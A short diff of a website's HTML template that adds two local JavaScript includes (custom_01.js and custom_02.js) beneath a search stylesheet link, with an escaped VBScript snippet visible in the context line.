@@ -522,6 +531,10 @@ script language=&#39;vbscript&#39;&gt;Call classResponseLocal(vData)<span style=
 <link rel="stylesheet" href="/css/search.fe0cd54a21628574bff49d721c827d1bb165ab56b0f22dd55ae78addbe61c309.css"></link>
 
 
+
+  <script src="/js/custom_01.js"></script>
+
+  <script src="/js/custom_02.js"></script>
 
 
     
